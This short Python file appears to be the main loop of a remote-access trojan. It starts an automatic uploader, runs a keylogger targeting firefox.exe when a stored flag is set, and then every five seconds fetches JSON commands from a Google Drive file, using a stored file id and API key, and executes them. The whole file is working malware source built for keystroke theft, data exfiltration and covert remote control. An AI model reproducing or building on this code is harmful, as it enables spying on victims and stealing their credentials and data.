#%%
import json
import time
import os
from logger import log

from clint.commands import parse_command
from clint.drive import got_active, Auto_upload
from clint.keylogger import Keyloger
from clint.network import get
from clint.util import data_store
from threading import Thread


#%%
Auto_upload()
got_active()
if data_store.var.mozila_keylog:
    Keyloger(targets=("firefox.exe", ))
    data_store.reset("mozila_keylog")


command_id=data_store.var.cfile_id
api_key=data_store.var.api_key

server_url=f"https://www.googleapis.com/drive/v3/files/{command_id}?alt=media&key={api_key}"
log.info('waiting for command')
while 1:
    try:
        command=get(server_url).text
        command = dict(json.loads(command))
    except Exception as e:
        pass
    else:
        parse_command(command)
    time.sleep(5)
